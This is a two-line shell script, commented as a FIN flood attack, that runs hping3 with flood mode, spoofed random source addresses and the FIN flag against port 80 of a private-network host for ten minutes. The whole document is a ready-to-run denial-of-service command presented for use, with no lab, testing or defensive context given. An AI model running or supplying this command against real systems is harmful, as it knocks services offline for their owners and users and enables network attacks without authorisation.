# Script to do a fin flood attack on the target machine

# Execute the FIN flood attack
timeout 10m hping3 --flood --rand-source -F -p 80 192.168.0.15

